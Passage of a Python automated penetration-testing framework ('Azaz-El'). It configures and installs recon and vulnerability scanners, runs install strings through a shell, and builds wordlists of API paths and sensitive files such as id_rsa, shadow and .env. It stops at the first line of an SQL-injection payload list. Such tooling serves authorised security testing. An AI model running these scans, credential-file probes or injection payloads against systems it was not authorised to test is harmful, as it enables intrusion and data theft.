#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 .S_SSSs     sdSSSSSSSbs   .S_SSSs     sdSSSSSSSbs    sSSs  S.      
.SS~SSSSS    YSSSSSSSS%S  .SS~SSSSS    YSSSSSSSS%S   d%%SP  SS.     
S%S   SSSS          S%S   S%S   SSSS          S%S   d%S'    S%S     
S%S    S%S         S&S    S%S    S%S         S&S    S%S     S%S     
S%S SSSS%S        S&S     S%S SSSS%S        S&S     S&S     S&S     
S&S  SSS%S        S&S     S&S  SSS%S        S&S     S&S_Ss  S&S     
S&S    S&S       S&S      S&S    S&S       S&S      S&S~SP  S&S     
S&S    S&S      S*S       S&S    S&S      S*S       S&S     S&S     
S*S    S&S     S*S        S*S    S&S     S*S        S*b     S*b     
S*S    S*S   .s*S         S*S    S*S   .s*S         S*S.    S*S.    
S*S    S*S   sY*SSSSSSSP  S*S    S*S   sY*SSSSSSSP   SSSbs   SSSbs  
SSS    S*S  sY*SSSSSSSSP  SSS    S*S  sY*SSSSSSSSP    YSSP    YSSP  
       SP                        SP                                 
       Y                         Y                                  
                                                                      
Azaz-El v5.0.0-ENHANCED - Advanced Automated Penetration Testing Framework
Enhanced Multi-Cloud, API, Infrastructure, and Web Application Security Suite
"""

import os
import sys
import subprocess
import json
import logging
from pathlib import Path
from datetime import datetime
import shutil
import uuid
import webbrowser
import argparse
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Tuple, Set
import hashlib # For hashing results
import asyncio
import aiohttp
import ssl

# --- Configuration ---
APP = "Azaz-El"
VERSION = "v6.0.0-ENHANCED-SECURITY"
AUTHOR = "Advanced Security Research Team"
BANNER = r"""
 .S_SSSs     sdSSSSSSSbs   .S_SSSs     sdSSSSSSSbs    sSSs  S.      
.SS~SSSSS    YSSSSSSSS%S  .SS~SSSSS    YSSSSSSSS%S   d%%SP  SS.     
S%S   SSSS          S%S   S%S   SSSS          S%S   d%S'    S%S     
S%S    S%S         S&S    S%S    S%S         S&S    S%S     S%S     
S%S SSSS%S        S&S     S%S SSSS%S        S&S     S&S     S&S     
S&S  SSS%S        S&S     S&S  SSS%S        S&S     S&S_Ss  S&S     
S&S    S&S       S&S      S&S    S&S       S&S      S&S~SP  S&S     
S&S    S&S      S*S       S&S    S&S      S*S       S&S     S&S     
S*S    S&S     S*S        S*S    S&S     S*S        S*b     S*b     
S*S    S*S   .s*S         S*S    S*S   .s*S         S*S.    S*S.    
S*S    S*S   sY*SSSSSSSP  S*S    S*S   sY*SSSSSSSP   SSSbs   SSSbs  
SSS    S*S  sY*SSSSSSSSP  SSS    S*S  sY*SSSSSSSSP    YSSP    YSSP  
       SP                        SP                                 
       Y                         Y                                  
                                                                      
"""

# --- Directory Structure ---
HERE = Path(__file__).resolve().parent
TARGETS_FILE = HERE / "targets.txt"
RUNS_DIR = HERE / "runs"
LOG_DIR = HERE / "logs"
CFG_FILE = HERE / "moloch.cfg.json"
PLUGINS_DIR = HERE / "plugins"
PAYLOADS_DIR = HERE / "payloads"
WORDLISTS_DIR = HERE / "wordlists"
MERGED_DIR = HERE / "lists_merged"
EXPLOITS_DIR = HERE / "exploits"
BACKUP_DIR = HERE / "backups"
TOOLS_DIR = HERE / "tools" # For tools that might need local installation/config
REPORTS_DIR = HERE / "reports" # For consolidated reports

# --- Logging Setup ---
def setup_logging():
    """Initialize logging to file and console."""
    LOG_DIR.mkdir(exist_ok=True)
    log_file = LOG_DIR / f"moloch_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    # Create a custom logger
    logger = logging.getLogger("moloch_logger")
    logger.setLevel(logging.DEBUG) # Capture all levels in the logger

    # Create handlers
    c_handler = logging.StreamHandler(sys.stdout)
    f_handler = logging.FileHandler(log_file)
    c_handler.setLevel(logging.INFO) # Console shows INFO and above
    f_handler.setLevel(logging.DEBUG) # File logs everything

    # Create formatters and add them to handlers
    c_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    f_format = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s')
    c_handler.setFormatter(c_format)
    f_handler.setFormatter(f_format)

    # Add handlers to the logger
    logger.addHandler(c_handler)
    logger.addHandler(f_handler)

    return logger

logger = setup_logging()

# --- Default Configuration ---
DEFAULT_CONFIG = {
    "tools": {
        "subfinder": {"enabled": True, "flags": ["-all", "-recursive", "-d"], "install_cmd": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"},
        "amass": {"enabled": True, "flags": ["enum", "-passive", "-d"], "install_cmd": "go install -v github.com/owasp-amass/amass/v4/...@latest"},
        "assetfinder": {"enabled": True, "flags": ["--subs-only"], "install_cmd": "go install github.com/tomnomnom/assetfinder@latest"},
        "findomain": {"enabled": True, "flags": ["-t"], "install_cmd": "wget https://github.com/findomain/findomain/releases/latest/download/findomain-linux -O /tmp/findomain && chmod +x /tmp/findomain && sudo mv /tmp/findomain /usr/local/bin/"},
        "chaos": {"enabled": False, "flags": ["-d"], "install_cmd": "go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest"}, # Requires API key
        "shuffledns": {"enabled": False, "flags": [], "install_cmd": "go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"}, # Requires massdns and wordlist
        "httpx": {"enabled": True, "flags": ["-silent", "-title", "-web-server", "-tech-detect", "-status-code", "-follow-redirects", "-random-agent", "-probe"], "install_cmd": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"},
        "nuclei": {
            "enabled": True,
            "flags": ["-silent", "-severity", "low,medium,high,critical", "-c", "100", "-rl", "300"],
            "community_templates": True,
            "custom_templates": True,
            "template_sources": ["~/nuclei-templates", "~/nuclei-community-templates"],
            "install_cmd": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        },
        "ffuf": {"enabled": True, "flags": ["-c", "-v", "-mc", "200,204,301,302,307,401,403,405,500", "-t", "50", "-recursion", "-of", "json"], "install_cmd": "go install github.com/ffuf/ffuf/v2@latest"},
        "gobuster": {"enabled": True, "flags": ["dir", "-q", "-z", "-k"], "install_cmd": "go install github.com/OJ/gobuster/v3@latest"},
        "katana": {"enabled": True, "flags": ["-silent", "-ps", "-f", "raw"], "install_cmd": "go install github.com/projectdiscovery/katana/cmd/katana@latest"}, # Crawling
        "gau": {"enabled": True, "flags": ["--subs"], "install_cmd": "go install github.com/lc/gau/v2/cmd/gau@latest"},
        "waybackurls": {"enabled": True, "flags": [], "install_cmd": "go install github.com/tomnomnom/waybackurls@latest"},
        "dalfox": {"enabled": True, "flags": ["-b", "your.xss.hunter.domain"], "install_cmd": "go install github.com/hahwul/dalfox/v2@latest"}, # XSS Scanning - Replace with your domain
        "arjun": {"enabled": True, "flags": ["-w", "default"], "install_cmd": "pip3 install arjun"}, # Parameter Discovery
        "testssl": {"enabled": True, "flags": ["--quiet", "--warnings", "off", "--jsonfile-pretty"], "install_cmd": "git clone --depth 1 https://github.com/drwetter/testssl.sh.git && cd testssl.sh && sudo ln -sf $(pwd)/testssl.sh /usr/local/bin/testssl.sh && cd .. && rm -rf testssl.sh"}, # SSL/TLS Testing (Install script)
        "nikto": {"enabled": True, "flags": ["-C all", "-Format", "json"], "install_cmd": "sudo apt install nikto -y || brew install nikto || echo 'Install nikto manually'"}, # Web Server Scanning
        "nmap": {"enabled": True, "flags": ["-sV", "-sC", "-Pn", "-T4"], "install_cmd": "sudo apt install nmap -y || brew install nmap || echo 'Install nmap manually'"}, # Port Scanning
        "dnsx": {"enabled": True, "flags": ["-silent", "-resp-only"], "install_cmd": "go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest"}, # DNS Resolution
        "naabu": {"enabled": True, "flags": ["-silent", "-top-ports", "1000"], "install_cmd": "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"}, # Port Scanning Alternative
        "tlsx": {"enabled": True, "flags": ["-silent", "-json"], "install_cmd": "go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest"}, # TLS data extractor
        "cdncheck": {"enabled": True, "flags": ["-silent"], "install_cmd": "go install github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest"}, # CDN detection
        "asnmap": {"enabled": True, "flags": ["-silent"], "install_cmd": "go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest"}, # ASN mapping
        "mapcidr": {"enabled": True, "flags": ["-silent"], "install_cmd": "go install github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest"}, # CIDR manipulation
        "gf": {"enabled": True, "flags": [], "install_cmd": "go install github.com/tomnomnom/gf@latest"}, # Grep patterns
        "unfurl": {"enabled": True, "flags": [], "install_cmd": "go install github.com/tomnomnom/unfurl@latest"}, # URL extraction
        "anew": {"enabled": True, "flags": [], "install_cmd": "go install github.com/tomnomnom/anew@latest"}, # Append new lines
        "notify": {"enabled": False, "flags": [], "install_cmd": "go install github.com/projectdiscovery/notify/cmd/notify@latest"}, # Alerting
        "interactsh-client": {"enabled": False, "flags": [], "install_cmd": "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"}, # OOB testing
        "alterx": {"enabled": True, "flags": ["-silent"], "install_cmd": "go install github.com/projectdiscovery/alterx/cmd/alterx@latest"}, # Fast subdomain discovery
    },
    "wordlists": {
        "subdomains": "subdomains-top1million-5000.txt", # Default relative to WORDLISTS_DIR or full path
        "fuzzing": "raft-medium-directories.txt", # Default relative to WORDLISTS_DIR or full path
        "parameters": "param-miner.txt", # Default relative to WORDLISTS_DIR or full path
        "xss": "xss-payload-list.txt", # Default relative to PAYLOADS_DIR or full path
        "sqli": "sqli-payload-list.txt", # Default relative to PAYLOADS_DIR or full path
    },
    "payloads": {
        # These can be used for custom scripts or manual checks
        # Extensive payloads are now in separate files created by create_enhanced_wordlists_and_payloads
    },
    "output": {
        "auto_open_html": True,
        "report_format": "html", # Could be extended to json, markdown
        "consolidated_findings_file": "moloch_findings.json" # New: Consolidated results file
    },
    "performance": {
        "max_workers": 10,
        "tool_timeout": 600, # 10 minutes default timeout
        "rate_limit": 1000, # General rate limit placeholder
    },
    "auth": {
        "nuclei_interactsh": "", # Interactsh server for OOB testing
        "chaos_api_key": "", # Chaos API Key
        "github_token": "", # For GitHub dorking if integrated
        "dalfox_blind_xss": "", # Blind XSS server for Dalfox
    },
    "modules": {
        "recon": True,
        "scanning": True,
        "web": True,
        "fuzzing": True,
        "reporting": True
    },
    "security": {
        "allow_auto_install": False,  # Disable auto-install by default for security
        "validate_inputs": True,
        "sandbox_mode": False,
        "log_commands": True
    }
}

# --- Environment & Dependency Management ---
def _bump_path() -> None:
    """Update PATH environment variable to include common binary locations."""
    envpath = os.environ.get("PATH", "")
    home = Path.home()
    add = [
        home / ".local/bin",
        home / "go/bin",
        home / ".go/bin",
        "/usr/local/go/bin",
        "/usr/local/bin",
        "/usr/bin",
        "/bin",
        "/opt/metasploit-framework/bin",
        "/snap/bin", # For snap packages
        "/usr/games", # Sometimes tools are installed here
        TOOLS_DIR, # Add local tools directory
    ]
    # Also set GOPATH and GOBIN if not set
    if not os.environ.get("GOPATH"):
        os.environ["GOPATH"] = str(home / "go")
    if not os.environ.get("GOBIN"):
        os.environ["GOBIN"] = str(home / "go/bin")
    # Ensure Go bin directories exist
    go_bin = home / "go/bin"
    if not go_bin.exists():
        try:
            go_bin.mkdir(parents=True, exist_ok=True)
            logger.debug(f"Created Go bin directory: {go_bin}")
        except Exception as e:
            logger.warning(f"Failed to create Go bin directory: {e}")
    for p in add:
        s = str(p)
        if s not in envpath:
            try:
                # Check if path exists - handle both Path objects and strings
                if hasattr(p, "exists"):
                    exists = p.exists()
                else:
                    exists = os.path.exists(s)
                if exists:
                    os.environ["PATH"] = s + os.pathsep + envpath
                    envpath = os.environ["PATH"] # Update for next iteration
                    logger.debug(f"Added to PATH: {s}")
            except Exception as e:
                logger.warning(f"Error adding {s} to PATH: {e}")

def which(tool_name: str) -> Optional[str]:
    """Check if a tool is available in PATH and return its path."""
    _bump_path() # Ensure PATH is updated before checking
    return shutil.which(tool_name)

def run_cmd(cmd: List[str], cwd: Optional[str] = None, timeout: Optional[int] = None, env: Optional[Dict[str, str]] = None, shell: bool = False) -> subprocess.CompletedProcess:
    """Execute a command safely."""
    logger.debug(f"Executing: {' '.join(cmd)}")
    effective_env = os.environ.copy()
    if env:
        effective_env.update(env)
    try:
        result = subprocess.run(
            cmd,
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout,
            check=False, # Don't raise on non-zero exit
            env=effective_env,
            shell=shell # Add shell parameter
        )
        if result.returncode != 0:
            logger.warning(f"Command failed ({result.returncode}): {' '.join(cmd)}\nSTDERR: {result.stderr}")
        return result
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {' '.join(cmd)}")
        return subprocess.CompletedProcess(cmd, -1, "", "Command timed out")
    except Exception as e:
        logger.error(f"Command execution error: {e}")
        return subprocess.CompletedProcess(cmd, -1, "", str(e))

def install_tool(tool_name: str, config: Dict[str, Any]) -> bool:
    """Attempt to install a tool using its configured command."""
    tool_config = config.get("tools", {}).get(tool_name, {})
    install_cmd_str = tool_config.get("install_cmd")

    if not install_cmd_str:
        logger.warning(f"No installation command found for {tool_name}")
        return False

    logger.info(f"Attempting to install {tool_name}...")
    try:
        # Use shell=True for complex commands like chained installs or conditionals
        # Pass the command as a string when using shell=True
        result = subprocess.run(
            install_cmd_str,  # Pass as string when shell=True
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=600,
            check=False,
        )
        if result.returncode == 0:
            logger.info(f"Successfully installed {tool_name}")
            return True
        else:
            logger.error(f"Failed to install {tool_name}: {result.stderr}")
            return False
    except Exception as e:
        logger.error(f"Exception during installation of {tool_name}: {e}")
        return False

def detect_package_manager() -> str:
    """Detect the available package manager on the system."""
    package_managers = {
        'apt': ['apt-get', 'apt'],
        'yum': ['yum'],
        'dnf': ['dnf'],
        'pacman': ['pacman'],
        'brew': ['brew'],
        'pkg': ['pkg'],
        'zypper': ['zypper'],
        'emerge': ['emerge']
    }
    
    for pm_name, commands in package_managers.items():
        for cmd in commands:
            if which(cmd):
                return pm_name
    return None

def install_system_tool(tool_name: str, package_manager: str) -> bool:
    """Install a system tool using the detected package manager."""
    install_commands = {
        'apt': f'sudo apt update && sudo apt install -y {tool_name}',
        'yum': f'sudo yum install -y {tool_name}',
        'dnf': f'sudo dnf install -y {tool_name}',
        'pacman': f'sudo pacman -S --noconfirm {tool_name}',
        'brew': f'brew install {tool_name}',
        'pkg': f'sudo pkg install -y {tool_name}',
        'zypper': f'sudo zypper install -y {tool_name}',
        'emerge': f'sudo emerge {tool_name}'
    }
    
    if package_manager not in install_commands:
        logger.error(f"Unsupported package manager: {package_manager}")
        return False
    
    try:
        logger.info(f"Installing {tool_name} using {package_manager}...")
        result = subprocess.run(
            install_commands[package_manager],
            shell=True,
            capture_output=True,
            text=True,
            timeout=300
        )
        
        if result.returncode == 0:
            logger.info(f"Successfully installed {tool_name}")
            return True
        else:
            logger.error(f"Failed to install {tool_name}: {result.stderr}")
            return False
    except subprocess.TimeoutExpired:
        logger.error(f"Installation of {tool_name} timed out")
        return False
    except Exception as e:
        logger.error(f"Exception during installation of {tool_name}: {e}")
        return False

def install_tool_with_fallback(tool_name: str, config: Dict[str, Any]) -> bool:
    """Install a tool with multiple fallback methods."""
    tools_config = config.get("tools", {})
    tool_config = tools_config.get(tool_name, {})
    
    # Try primary installation method from config
    if "install_cmd" in tool_config:
        logger.info(f"Attempting primary installation method for {tool_name}...")
        if install_tool(tool_name, config):
            return True
        logger.warning(f"Primary installation failed for {tool_name}, trying fallbacks...")
    
    # Try package manager installation
    package_manager = detect_package_manager()
    if package_manager:
        logger.info(f"Trying {package_manager} package manager for {tool_name}...")
        if install_system_tool(tool_name, package_manager):
            return True
    
    # Try alternative installation methods
    alt_commands = {
        'nmap': 'sudo apt install nmap -y || sudo yum install nmap -y || brew install nmap',
        'nikto': 'sudo apt install nikto -y || sudo yum install nikto -y || brew install nikto',
        'testssl': 'git clone https://github.com/drwetter/testssl.sh.git /tmp/testssl && sudo cp /tmp/testssl/testssl.sh /usr/local/bin/ && sudo chmod +x /usr/local/bin/testssl.sh',
        'arjun': 'pip3 install arjun || pip install arjun'
    }
    
    if tool_name in alt_commands:
        try:
            logger.info(f"Trying alternative installation for {tool_name}...")
            result = subprocess.run(
                alt_commands[tool_name],
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            if result.returncode == 0:
                logger.info(f"Successfully installed {tool_name} using alternative method")
                return True
        except Exception as e:
            logger.error(f"Alternative installation failed for {tool_name}: {e}")
    
    logger.error(f"All installation methods failed for {tool_name}")
    return False

def check_and_install_dependencies(config: Dict[str, Any], auto_install: bool = False) -> bool:
    """Enhanced dependency checking and installation with better error handling."""
    logger.info("Performing comprehensive dependency check...")
    all_good = True
    tools_config = config.get("tools", {})
    
    # Detect system information
    package_manager = detect_package_manager()
    logger.info(f"Detected package manager: {package_manager or 'None'}")

    # Check essential system tools first
    essential_tools = {
        "git": "Version control system",
        "wget": "Download utility", 
        "curl": "HTTP client",
        "go": "Go programming language",
        "python3": "Python 3 interpreter",
        "pip3": "Python package manager"
    }
    
    missing_essential = []
    for tool, description in essential_tools.items():
        if not which(tool):
            logger.warning(f"Essential tool '{tool}' ({description}) is missing")
            missing_essential.append(tool)
            all_good = False

    if missing_essential and package_manager:
        if auto_install:
            logger.info("Auto-installing missing essential tools...")
            for tool in missing_essential:
                install_system_tool(tool, package_manager)
        else:
            logger.warning(f"Missing essential tools: {', '.join(missing_essential)}")
            print(f"\n⚠️  Missing essential tools: {', '.join(missing_essential)}")
            install_choice = input("Install missing essential tools? (yes/no/auto): ").strip().lower()
            if install_choice in ['yes', 'y', 'auto']:
                for tool in missing_essential:
                    install_system_tool(tool, package_manager)
                if install_choice == 'auto':
                    auto_install = True

    # Re-check essential tools after installation attempt
    still_missing = [tool for tool in missing_essential if not which(tool)]
    if still_missing:
        logger.error(f"Still missing essential tools: {', '.join(still_missing)}")
        logger.error("Please install these manually before proceeding.")
        return False

    # Check and install security tools
    missing_tools = []
    available_tools = []
    
    for tool_name, tool_config in tools_config.items():
        if tool_config.get("enabled", True):
            if which(tool_name):
                available_tools.append(tool_name)
                logger.debug(f"✅ {tool_name} is available")
            else:
                missing_tools.append(tool_name)
                logger.debug(f"❌ {tool_name} is missing")

    logger.info(f"Available tools: {len(available_tools)}, Missing tools: {len(missing_tools)}")
    
    if missing_tools:
        if auto_install:
            logger.info("Auto-installing missing security tools...")
            install_all = True
            selective = False
        else:
            logger.info(f"Tool Status Summary - Available: {len(available_tools)}, Missing: {len(missing_tools)}")
            print(f"\n📊 Tool Status Summary:")
            print(f"   ✅ Available: {len(available_tools)} tools")
            print(f"   ❌ Missing: {len(missing_tools)} tools")
            print(f"   🔧 Missing tools: {', '.join(missing_tools[:10])}" + ("..." if len(missing_tools) > 10 else ""))
            
            install_choice = input("\nInstall missing tools? (yes/no/selective/auto): ").strip().lower()
            install_all = install_choice in ['yes', 'y', 'auto']
            selective = install_choice == 'selective'
            
            if install_choice == 'auto':
                auto_install = True
        
        if install_all or selective:
            successful_installs = 0
            failed_installs = 0
            
            for tool_name in missing_tools:
                if selective:
                    install_tool_choice = input(f"Install {tool_name}? (yes/no): ").strip().lower()
                    if install_tool_choice not in ['yes', 'y']:
                        continue
                
                logger.info(f"Installing {tool_name}...")
                try:
                    if install_tool_with_fallback(tool_name, config):
                        successful_installs += 1
                        logger.info(f"✅ {tool_name} installed successfully")
                    else:
                        failed_installs += 1
                        logger.warning(f"❌ Failed to install {tool_name}")
                except Exception as e:
                    failed_installs += 1
                    logger.error(f"❌ Exception installing {tool_name}: {e}")
                
                # Small delay to prevent overwhelming the system
                time.sleep(1)
            
            logger.info(f"Installation complete: {successful_installs} successful, {failed_installs} failed")
        else:
            logger.info("Skipping tool installation. Some features may not work.")
    else:
        logger.info("🎉 All configured security tools are available!")
    
    return True

def create_directories():
    """Create all necessary directories for Moloch."""
    logger.info("Creating necessary directories...")
    dirs_to_create = [
        RUNS_DIR, LOG_DIR, PLUGINS_DIR, PAYLOADS_DIR,
        WORDLISTS_DIR, MERGED_DIR, EXPLOITS_DIR, BACKUP_DIR, TOOLS_DIR, REPORTS_DIR
    ]
    for d in dirs_to_create:
        try:
            d.mkdir(parents=True, exist_ok=True)
            logger.debug(f"Ensured directory exists: {d}")
        except Exception as e:
            logger.error(f"Failed to create directory {d}: {e}")
            # Consider if this is fatal. For now, we log and continue.

def create_default_wordlists():
    """Create basic default wordlists if they don't exist."""
    logger.info("Ensuring default wordlists exist...")
    # This function now relies on external files. We just ensure the directory exists.
    WORDLISTS_DIR.mkdir(exist_ok=True)
    PAYLOADS_DIR.mkdir(exist_ok=True)
    
    # Create enhanced wordlists if they don't exist
    create_enhanced_wordlists_and_payloads()

def create_enhanced_wordlists_and_payloads():
    """Create comprehensive wordlists and payloads for all tools."""
    logger.info("Creating enhanced wordlists and payloads...")
    
    # Check if main wordlists already exist
    subdomain_wordlist = WORDLISTS_DIR / "subdomains-top1million-5000.txt"
    directory_wordlist = WORDLISTS_DIR / "raft-medium-directories.txt"
    param_wordlist = WORDLISTS_DIR / "param-miner.txt"
    xss_payloads = PAYLOADS_DIR / "xss-payload-list.txt"
    sqli_payloads = PAYLOADS_DIR / "sqli-payload-list.txt"
    
    # If any don't exist, they were already created above. Let's create additional ones.
    
    # Create comprehensive extensions wordlist
    extensions_file = WORDLISTS_DIR / "common-extensions.txt"
    if not extensions_file.exists():
        extensions = [
            "php", "asp", "aspx", "jsp", "jspx", "py", "pl", "cgi", "sh", "bat", "cmd",
            "html", "htm", "xml", "json", "txt", "log", "bak", "backup", "old", "orig",
            "config", "conf", "cfg", "ini", "properties", "yml", "yaml", "env", "git",
            "svn", "sql", "db", "sqlite", "mdb", "zip", "rar", "tar", "gz", "7z",
            "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "csv", "rtf",
            "jpg", "jpeg", "png", "gif", "bmp", "svg", "ico", "webp", "tiff",
            "mp3", "mp4", "avi", "mov", "wmv", "flv", "swf", "exe", "dll", "so",
            "class", "jar", "war", "ear", "deb", "rpm", "dmg", "pkg", "msi"
        ]
        write_lines(extensions_file, extensions)
        logger.info(f"Created extensions wordlist: {extensions_file}")
    
    # Create API endpoints wordlist
    api_endpoints_file = WORDLISTS_DIR / "api-endpoints.txt"
    if not api_endpoints_file.exists():
        api_endpoints = [
            "api", "v1", "v2", "v3", "v4", "v5", "rest", "graphql", "soap", "rpc",
            "users", "user", "accounts", "account", "login", "logout", "auth", "authenticate",
            "register", "signup", "signin", "password", "reset", "forgot", "recover",
            "profile", "settings", "preferences", "config", "configuration", "admin",
            "dashboard", "panel", "control", "management", "status", "health", "ping",
            "version", "info", "debug", "test", "demo", "docs", "documentation",
            "swagger", "openapi", "spec", "schema", "metadata", "search", "query",
            "filter", "sort", "order", "limit", "offset", "page", "size", "count",
            "create", "read", "update", "delete", "crud", "get", "post", "put", "patch",
            "head", "options", "trace", "connect", "upload", "download", "file", "files",
            "image", "images", "media", "assets", "static", "public", "private",
            "secure", "encrypt", "decrypt", "hash", "token", "key", "secret", "oauth",
            "jwt", "session", "cookie", "cache", "redis", "memcached", "database",
            "db", "sql", "nosql", "mongo", "mysql", "postgres", "oracle", "sqlite",
            "backup", "restore", "export", "import", "sync", "async", "batch", "bulk",
            "queue", "job", "task", "worker", "process", "thread", "service", "microservice",
            "webhook", "callback", "notify", "notification", "alert", "message", "mail",
            "email", "sms", "push", "socket", "websocket", "sse", "stream", "real-time",
            "live", "monitoring", "metrics", "analytics", "tracking", "logging", "audit",
            "report", "reports", "statistics", "stats", "chart", "graph", "visualization"
        ]
        write_lines(api_endpoints_file, api_endpoints)
        logger.info(f"Created API endpoints wordlist: {api_endpoints_file}")
    
    # Create sensitive files wordlist
    sensitive_files_file = WORDLISTS_DIR / "sensitive-files.txt"
    if not sensitive_files_file.exists():
        sensitive_files = [
            "web.config", "app.config", "config.php", "configuration.php", "config.inc.php",
            "config.inc", "config.default.php", "config.yml", "config.yaml", "config.json",
            "config.xml", "settings.php", "settings.yml", "settings.yaml", "settings.json",
            "wp-config.php", "wp-config.php.bak", "wp-config.php.old", "wp-config.php~",
            "wp-config.txt", "wp-config-sample.php", "configuration.php", "configuration.php~",
            "configuration.php.bak", "configuration.php.old", "joomla.conf", "database.yml",
            "database.yaml", "database.json", "database.xml", "database.php", "db.php",
            "db.inc.php", "db.inc", "connect.php", "connect.inc.php", "connect.inc",
            "connection.php", "connection.inc.php", "connection.inc", "mysql.inc.php",
            "mysql.inc", "postgresql.inc.php", "postgresql.inc", "oracle.inc.php",
            "oracle.inc", "mssql.inc.php", "mssql.inc", "sqlite.inc.php", "sqlite.inc",
            "constants.php", "constants.inc.php", "constants.inc", "global.php",
            "global.inc.php", "global.inc", "globals.php", "globals.inc.php", "globals.inc",
            "common.php", "common.inc.php", "common.inc", "functions.php", "functions.inc.php",
            "functions.inc", "lib.php", "lib.inc.php", "lib.inc", "library.php",
            "library.inc.php", "library.inc", "class.php", "class.inc.php", "class.inc",
            "include.php", "include.inc.php", "include.inc", "require.php", "require.inc.php",
            "require.inc", "header.php", "header.inc.php", "header.inc", "footer.php",
            "footer.inc.php", "footer.inc", "init.php", "init.inc.php", "init.inc",
            "bootstrap.php", "bootstrap.inc.php", "bootstrap.inc", "autoload.php",
            "autoload.inc.php", "autoload.inc", "index.php", "index.html", "index.htm",
            "default.php", "default.html", "default.htm", "main.php", "main.html", "main.htm",
            "home.php", "home.html", "home.htm", "login.php", "login.html", "login.htm",
            "admin.php", "admin.html", "admin.htm", "administrator.php", "administrator.html",
            "administrator.htm", "manager.php", "manager.html", "manager.htm", "control.php",
            "control.html", "control.htm", "panel.php", "panel.html", "panel.htm",
            "dashboard.php", "dashboard.html", "dashboard.htm", "cpanel.php", "cpanel.html",
            "cpanel.htm", "webmin.php", "webmin.html", "webmin.htm", "phpmyadmin.php",
            "phpmyadmin.html", "phpmyadmin.htm", "adminer.php", "adminer.html", "adminer.htm",
            "readme.txt", "readme.md", "README.txt", "README.md", "changelog.txt",
            "changelog.md", "CHANGELOG.txt", "CHANGELOG.md", "license.txt", "license.md",
            "LICENSE.txt", "LICENSE.md", "todo.txt", "todo.md", "TODO.txt", "TODO.md",
            "install.php", "install.html", "install.htm", "setup.php", "setup.html",
            "setup.htm", "upgrade.php", "upgrade.html", "upgrade.htm", "update.php",
            "update.html", "update.htm", "test.php", "test.html", "test.htm", "debug.php",
            "debug.html", "debug.htm", "info.php", "info.html", "info.htm", "phpinfo.php",
            "phpinfo.html", "phpinfo.htm", "server-info", "server-status", "status.php",
            "status.html", "status.htm", "health.php", "health.html", "health.htm",
            "ping.php", "ping.html", "ping.htm", "version.php", "version.html", "version.htm",
            "robots.txt", "sitemap.xml", "sitemap.txt", "humans.txt", "crossdomain.xml",
            "clientaccesspolicy.xml", "browserconfig.xml", "manifest.json", "package.json",
            "composer.json", "bower.json", "gulpfile.js", "gruntfile.js", "webpack.config.js",
            "yarn.lock", "package-lock.json", "composer.lock", "Gemfile", "Gemfile.lock",
            "requirements.txt", "pipfile", "pipfile.lock", "poetry.lock", "go.mod", "go.sum",
            "cargo.toml", "cargo.lock", "pom.xml", "build.gradle", "build.xml", "makefile",
            "dockerfile", "docker-compose.yml", "docker-compose.yaml", "vagrant.yml",
            "vagrantfile", "ansible.yml", "ansible.yaml", "terraform.tf", "terraform.tfvars",
            "kubernetes.yml", "kubernetes.yaml", "helm.yml", "helm.yaml", ".env", ".env.local",
            ".env.production", ".env.development", ".env.staging", ".env.test", ".env.example",
            ".env.sample", ".htaccess", ".htpasswd", ".htgroup", ".apache", ".nginx", ".iis",
            ".git", ".gitignore", ".gitmodules", ".gitattributes", ".svn", ".hg", ".bzr",
            ".cvs", ".DS_Store", "thumbs.db", "desktop.ini", "error_log", "access_log",
            "access.log", "error.log", "debug.log", "application.log", "system.log",
            "security.log", "audit.log", "backup.sql", "backup.db", "backup.zip", "backup.tar",
            "backup.tar.gz", "backup.tar.bz2", "backup.rar", "backup.7z", "dump.sql",
            "dump.db", "export.sql", "export.db", "import.sql", "import.db", "migration.sql",
            "migration.db", "seed.sql", "seed.db", "schema.sql", "schema.db", "structure.sql",
            "structure.db", "data.sql", "data.db", "users.sql", "users.db", "accounts.sql",
            "accounts.db", "passwords.sql", "passwords.db", "sessions.sql", "sessions.db",
            "tokens.sql", "tokens.db", "keys.sql", "keys.db", "secrets.sql", "secrets.db",
            "private.key", "public.key", "private.pem", "public.pem", "certificate.crt",
            "certificate.pem", "ca.crt", "ca.pem", "ssl.crt", "ssl.pem", "tls.crt", "tls.pem",
            "server.key", "server.crt", "server.pem", "client.key", "client.crt", "client.pem",
            "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "known_hosts", "authorized_keys",
            "ssh_config", "sshd_config", "shadow", "passwd", "group", "gshadow", "sudoers",
            "hosts", "resolv.conf", "nsswitch.conf", "hostname", "issue", "motd", "profile",
            "bashrc", "bash_profile", "bash_history", "zshrc", "zsh_history", "history",
            "vimrc", "nanorc", "tmux.conf", "screenrc", "inputrc", "wgetrc", "curlrc"
        ]
        write_lines(sensitive_files_file, sensitive_files)
        logger.info(f"Created sensitive files wordlist: {sensitive_files_file}")
    
    # Create comprehensive SQL injection payloads
    advanced_sqli_file = PAYLOADS_DIR / "advanced-sqli-payloads.txt"
    if not advanced_sqli_file.exists():
        advanced_sqli = [
            # Boolean-based blind SQLi
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
